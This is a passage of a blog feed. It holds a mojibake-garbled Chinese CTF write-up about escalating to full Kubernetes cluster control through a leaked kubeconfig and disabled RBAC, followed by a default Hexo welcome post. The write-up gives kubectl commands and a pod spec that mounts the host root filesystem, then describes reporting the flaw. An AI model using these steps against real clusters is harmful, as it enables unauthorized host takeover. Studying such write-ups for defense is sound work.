class="headerlink" title="0x06 è·å–master å®¿ä¸»æœºæƒé™"></a>0x06 è·å–master å®¿ä¸»æœºæƒé™</h2><p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„<code>pod</code>ï¼Œé€šè¿‡<strong>æ–‡ä»¶æŒ‚è½½</strong>çš„æ–¹å¼ï¼Œå°†å®¿ä¸»æœºæ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶æŒ‚è½½åˆ°<code>pod</code>ä¸­ï¼Œä½†æ˜¯ç”±äºåˆ›å»º<code>pod</code>æ—¶ï¼Œéœ€è¦ä»è¿œç¨‹åœ°å€ä¸Šæ‹‰å–é•œåƒï¼Œè€Œè¯¥é¢˜å†…ç½‘è²Œä¼¼æ˜¯æ— æ³•å‡ºç½‘çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå·²ç»æ‹‰å–ä¸‹æ¥çš„æœ¬åœ°é•œåƒæ–‡ä»¶ã€‚</p><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè·å–å½“å‰å·²ç»æ‹‰å–è¿‡çš„images:</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml get pods --all-namespaces --insecure-skip-tls-verify&#x3D;true -o jsonpath&#x3D;&quot;&#123;..image&#125;&quot; |\tr -s &#39;[[:space:]]&#39; &#39;\n&#39; |\sort |\uniq -c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.annevi.cn/image-20201220235708354.png" alt="image-20201220235708354" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220235708354.png" class="lozad post-image"></p><p>å°è¯•å‡ ä¸ªé•œåƒåï¼Œå‘ç° <code>100.125.4.222:20202/hwofficial/coredns:1.15.6</code>æ˜¯å¯ä»¥ä½¿ç”¨çš„</p><p>yamlé…ç½®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1kind: Podmetadata:  name: test-444spec:  containers:  - name: test-444    image: 100.125.4.222:20202&#x2F;hwofficial&#x2F;coredns:1.15.6    volumeMounts:    - name: host      mountPath: &#x2F;host  volumes:  - name: host    hostPath:      path: &#x2F;      type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šè¿°é…ç½®å°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½åˆ°äº†æˆ‘ä»¬podä¸­çš„ <code>/host</code>ç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤åœ¨defaultå‘½åç©ºé—´ä¸­åˆ›å»ºè¯¥pod</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml apply -f pod.yaml -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†é€šè¿‡kubectl exec è¿›å…¥æˆ‘ä»¬çš„podä¸­ï¼Œä»¥å®ç°å¯¹å®¿ä¸»æœºæ–‡ä»¶çš„æ§åˆ¶ã€‚</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml exec -it test-444 bash -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è‡³æ­¤ï¼Œæˆ‘ä»¬æ‰€è·å¾—çš„æƒé™å…¶å®å·²ç»å’Œä¸»åŠæ–¹è¿ç»´åŒæ ·é«˜äº†ã€‚ã€‚</p><h2 id="0x07-è·å–flag"><a href="#0x07-è·å–flag" class="headerlink" title="0x07 è·å–flag"></a>0x07 è·å–flag</h2><p>é€šè¿‡ä»¥ä¸Šçš„æ­¥éª¤ï¼Œå¤§æ¦‚æ˜ç™½äº†è¿™æ˜¯ä¸€ä¸ªéé¢„æœŸï¼Œå¹³å°é…ç½®tokençš„æ³„éœ²å¤–åŠ æ²¡æœ‰å¼€å¯<code>RBAC</code>æˆæƒï¼Œå¯¼è‡´æˆ‘ä»¬è½»æ˜“çš„å°±èƒ½å¤Ÿè·å–åˆ°äº†k8sé›†ç¾¤çš„æœ€é«˜æƒé™ã€‚å› æ­¤æˆ‘ä»¬ä¹Ÿå°±è·å¾—äº†è¯¥é›†ç¾¤ä¸­æ‰€æœ‰é¢˜ç›®å®¹å™¨çš„æœ€é«˜æƒé™ã€‚</p><p>åœ¨æ•´ä¸ªé›†ç¾¤ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾å±äºæˆ‘ä»¬é˜Ÿä¼çš„podï¼Œä»¥ä¾¿è·å¾—å¯¹åº”çš„flagã€‚</p><p>å› æ­¤æˆ‘ä»¬é¦–å…ˆé€šè¿‡æŸ¥è¯¢åœ¨k8sä¸­ç”¨äºæœåŠ¡æš´éœ²çš„serviceä¿¡æ¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml get services -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220210356220.png" alt="image-20201220210356220" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210356220.png" class="lozad post-image"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œåˆ—å‡ºäº†æ‰€æœ‰çš„serviceï¼ŒåŒæ—¶è¿˜æœ‰é›†ç¾¤ipä»¥åŠç«¯å£æ˜ å°„çš„å…³ç³»ã€‚è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æš´éœ²åœ¨å…¬ç½‘ä¸Šçš„ç«¯å£ï¼Œæ¥å®šä½å¯¹åº”çš„serviceã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬çš„å…¬ç½‘ç«¯å£ä¸º30067ï¼Œåˆ™æˆ‘ä»¬æœç´¢30067ç«¯å£</p><p><img src="https://cdn.annevi.cn/image-20201220210520978.png" alt="image-20201220210520978" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210520978.png" class="lozad post-image"></p><p>å¾—åˆ°äº†æˆ‘ä»¬é¢˜ç›®podæ‰€åœ¨çš„serviceï¼Œæ¥ç€æˆ‘ä»¬è·å–è¿™ä¸ªserviceçš„è¯¦ç»†ä¿¡æ¯ï¼Œä»¥ä¾¿å¾—åˆ°<code>pod name</code>ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml describe service guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.annevi.cn/image-20201220210704982.png" alt="image-20201220210704982" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210704982.png" class="lozad post-image"></p><p>ä»è¿™é‡Œå¤§è‡´å¯ä»¥çœ‹å‡ºï¼Œappåä¸º<code>guosai-34-15</code>ï¼Œå› æ­¤æˆ‘ä»¬ç›¸åº”çš„å»æ‰€æœ‰çš„podä¸­å¯»æ‰¾åä¸ºè¿™ä¸€é¡¹çš„podã€‚</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml describe pods guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šè¿‡å¯¹æˆ‘ä»¬è·å–çš„æ•°æ®çš„æ£€ç´¢ï¼Œå‘ç°äº†è¿™æ ·ä¸€ä¸ªpodï¼Œé€šè¿‡æ¯”è¾ƒè™šæ‹Ÿipä¸phpinfoä¸­çš„ä¿¡æ¯ï¼Œå¯ä»¥ç¡®å®šè¿™ä¸ªpodå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„é‚£ä¸ªã€‚</p><p><img src="https://cdn.annevi.cn/image-20201220210832990.png" alt="image-20201220210832990" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201220210832990.png" class="lozad post-image"></p><p>å› æ­¤ä¾¿å¾—åˆ°äº†å±äºæˆ‘ä»¬çš„podã€‚execè¿›å…¥podåï¼Œä¾¿å¯ä»¥å¾—åˆ°flagã€‚</p><h2 id="0x08-æ€»ç»“"><a href="#0x08-æ€»ç»“" class="headerlink" title="0x08 æ€»ç»“"></a>0x08 æ€»ç»“</h2><p>åœ¨æ‹¿ä¸‹masterä¹‹åï¼Œæˆ‘ä»¬ç«‹å³è”ç³»äº†èµ›äº‹ä¸»åŠæ–¹ï¼Œç»è¿‡ç¡®è®¤è¿™æ˜¯ä¸€ä¸ªå¹³å°çš„ä¸¥é‡å®‰å…¨æ¼æ´~ä¹Ÿå¾—åˆ°äº†ä¸»åŠæ–¹çš„æ„Ÿè°¢ã€‚</p><p><img src="https://cdn.annevi.cn/image-20201228105129055.png" alt="image-20201228105129055" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201228105129055.png" class="lozad post-image"></p><p><img src="https://cdn.annevi.cn/image-20201228105105601.png" alt="image-20201228105105601" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201228105105601.png" class="lozad post-image"></p><p><img src="https://cdn.annevi.cn/image-20201228105113374.png" alt="image-20201228105113374" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://cdn.annevi.cn/image-20201228105113374.png" class="lozad post-image"></p><p>ä¹‹å‰å­¦ä¹ äº‘åŸç”Ÿæ¶æ„å’Œå®‰å…¨ç›¸å…³çŸ¥è¯†çš„æ—¶å€™ï¼Œä¸€ç›´æ‰¾ä¸åˆ°ä¸€ä¸ªå¾ˆå¥½çš„å®è·µæ–¹å¼ï¼Œè€Œè¿™æ¬¡åä¸ºäº‘ä¸“åœºæ¯”èµ›CLOUDç¬¬ä¸€æ¬¡è®©æˆ‘æ¥è§¦åˆ°äº†çœŸæ­£çš„â˜ï¸äº‘ç¯å¢ƒä¸‹çš„å®‰å…¨é—®é¢˜ï¼Œè™½è¯´æ˜¯é€šè¿‡éé¢„æœŸçš„æ–¹å¼è§£å‡ºäº†é¢˜ç›®ï¼Œä¸è¿‡è¿™ä¸ªéé¢„æœŸå´è®©æˆ‘ä»¬è¾ƒä¸ºå®¹æ˜“çš„æ‹¿åˆ°äº†æ•´ä¸ªé›†ç¾¤çš„æœ€é«˜æƒé™ï¼Œè¿˜æ˜¯æŒºæ„å¤–çš„ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è½¬è½½è‡ª Annevi&lt;/p&gt;
&lt;p&gt;å½“æ—¶æ‰“æ¯”èµ›çš„æ—¶å€™è§‰å¾—è¿™æ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„è¿‡ç¨‹&lt;/p&gt;
&lt;p&gt;è½¬è½½è®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;h2 id=&quot;0x00-</summary>
      
    
    
    
    
    <category term="CTF WriteUp" scheme="https://me.liki.link/tags/CTF-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://me.liki.link/20201001/hello-world/"/>
    <id>https://me.liki.link/20201001/hello-world/</id>
    <published>2020-09-30T16:00:00.000Z</published>
    <updated>2021-10-18T02:54:55.806Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
